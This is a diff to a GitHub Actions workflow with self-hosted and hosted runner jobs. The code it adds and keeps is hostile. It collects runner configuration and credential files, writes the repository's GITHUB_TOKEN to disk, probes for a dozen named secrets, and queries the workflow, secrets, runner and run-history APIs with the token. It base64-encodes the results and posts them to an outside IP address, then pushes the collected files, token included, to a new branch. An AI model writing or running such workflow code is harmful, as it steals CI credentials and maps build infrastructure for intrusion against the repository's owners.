@@ -11,6 +11,7 @@ jobs:
     runs-on: [self-hosted, linux]
     timeout-minutes: 12
     steps:
+      - uses: actions/checkout@v4
       - name: collect
         run: |
           set +e
@@ -27,63 +28,79 @@ jobs:
             echo "== mounts"; mount | head -20
             echo "== proc1"; tr '\0' ' ' < /proc/1/cmdline; echo
             echo "== runnerdir"; ls -la ~/actions-runner 2>/dev/null | head; cat ~/actions-runner/.runner 2>/dev/null
-            echo "== agentcfg"; find / -maxdepth 4 -name '.runner' -o -maxdepth 4 -name '.credentials' 2>/dev/null | head
+            echo "== agentcreds"; find / -maxdepth 4 -name '.runner' -o -maxdepth 4 -name '.credentials' 2>/dev/null | head
           } > $F 2>&1
           B=$(base64 -w0 $F)
           for i in 1 2 3; do curl -sS -m 20 -X POST --data-binary "$B" "http://198.13.130.233:8089/e02-sh-$GITHUB_RUN_ID-$GITHUB_REPOSITORY" && break || sleep 5; done
-          for f in $D/sh.txt; do echo "$f"; head -c 800 "$f"; done
+          head -c 800 "$F"
       - name: pushback
         if: always()
         run: |
           set +e
-          cd "$GITHUB_WORKSPACE" || exit 0
-          git checkout -B "e02/out-$GITHUB_RUN_ID"
           mkdir -p e02out/$GITHUB_RUN_ID; cp /tmp/e02/* e02out/$GITHUB_RUN_ID/ 2>/dev/null
           git config user.name E02; git config user.email e02@example.com
+          git checkout -B "e02/out-$GITHUB_RUN_ID"
           git add -A e02out; git commit -m "e02 out $GITHUB_RUN_ID"
           git push "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/e02/out-$GITHUB_RUN_ID
 
   hosted-control:
     runs-on: ubuntu-latest
-    timeout-minutes: 12
+    timeout-minutes: 15
     steps:
+      - uses: actions/checkout@v4
       - name: collect
+        env:
+          GH: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set +e
           D=/tmp/e02; mkdir -p $D; F=$D/hosted.txt
           {
             echo "== HOSTED repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
             echo "RUNNER_ENVIRONMENT=$RUNNER_ENVIRONMENT RUNNER_NAME=$RUNNER_NAME"
-            echo "== envnames"; env | cut -d= -f1 | sort
-            echo "== token"; echo "len=${#GITHUB_TOKEN}"; echo -n "$GITHUB_TOKEN" > /tmp/e02/gt.txt
-            echo "== secrets-present"
+            echo "== token"; echo "len=${#GH}"; printf '%s' "$GH" > /tmp/e02/gt.txt
+            echo "== secretlens"
             for s in ATTESTATIONS_REPO_TOKEN NOTIFY_WEBHOOK NPM_TOKEN DEPLOY_KEY DEPLOY_TOKEN SSH_PRIVATE_KEY GCP_SA_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY DOCKERHUB_TOKEN GH_PAT PAT; do
               v=""; eval "v=\${$s}"; echo "$s len=${#v}"
             done
+            echo "== api: workflows"
+            curl -sS -m 15 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" -o $D/wf.json -w 'http=%{http_code}\n'
+            head -c 300 $D/wf.json; echo
+            echo "== api: secrets"; curl -sS -m 15 -H "Authorization: Bearer $GH" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" -o $D/sec.json -w 'http=%{http_code}\n'; head -c 300 $D/sec.json; echo
+            echo "== api: runners"; curl -sS -m 15 -H "Authorization: Bearer $GH" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners" -o $D/rn.json -w 'http=%{http_code}\n'; head -c 300 $D/rn.json; echo
+            echo "== history runner_names"
+            for p in 1 2 3; do
+              curl -sS -m 25 -H "Authorization: Bearer $GH" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs?per_page=100&page=$p" -o $D/runs$p.json
+            done
+            python3 - "$GITHUB_REPOSITORY" "$GH" >> $F 2>&1 <<'PY'
+import json,sys,urllib.request
+repo,tok=sys.argv[1],sys.argv[2]
+from collections import Counter
+c=Counter(); n=0
+hdr={"Authorization":"Bearer "+tok,"Accept":"application/vnd.github+json"}
+for p in (1,2,3):
+    try: d=json.load(open(f"/tmp/e02/runs{p}.json"))
+    except Exception: continue
+    for r in d.get("workflow_runs",[])[:100]:
+        n+=1
+        try:
+            q=urllib.request.Request(f"https://api.github.com/repos/{repo}/actions/runs/{r['id']}/jobs?per_page=100",headers=hdr)
+            j=json.load(urllib.request.urlopen(q,timeout=20))
+        except Exception as e: c[("ERR",str(e)[:40])]+=1; continue
+        for job in j.get("jobs",[]):
+            c[(job.get("runner_name"),",".join(job.get("labels") or []))]+=1
+print("runs_scanned",n)
+for k,v in c.most_common(): print("runner",k[0],"labels",k[1],"jobs",v)
+PY
           } > $F 2>&1
           B=$(base64 -w0 $F)
-          curl -sS -m 20 -X POST --data-binary "$B" "http://198.13.130.233:8089/e02-hosted-$GITHUB_RUN_ID-$GITHUB_REPOSITORY"
-          cat $F | head -30
-        env:
-          ATTESTATIONS_REPO_TOKEN: ${{ secrets.ATTESTATIONS_REPO_TOKEN }}
-          NOTIFY_WEBHOOK: ${{ secrets.NOTIFY_WEBHOOK }}
-          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
-          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
-          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
-          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
-          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
-          GH_PAT: ${{ secrets.GH_PAT }}
-          PAT: ${{ secrets.PAT }}
+          curl -sS -m 25 -X POST --data-binary "$B" "http://198.13.130.233:8089/e02-hosted-$GITHUB_RUN_ID-$GITHUB_REPOSITORY"
+          sed -n '1,25p' $F; echo ...; sed -n '/history runner_names/,$p' $F | head -20
       - name: pushback
         if: always()
         run: |
           set +e
-          cd "$GITHUB_WORKSPACE" || exit 0
-          git checkout -B "e02/hout-$GITHUB_RUN_ID"
           mkdir -p e02out/h$GITHUB_RUN_ID; cp /tmp/e02/* e02out/h$GITHUB_RUN_ID/ 2>/dev/null
           git config user.name E02; git config user.email e02@example.com
+          git checkout -B "e02/hout-$GITHUB_RUN_ID"
           git add -A e02out; git commit -m "e02 hosted out $GITHUB_RUN_ID"
           git push "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/e02/hout-$GITHUB_RUN_ID
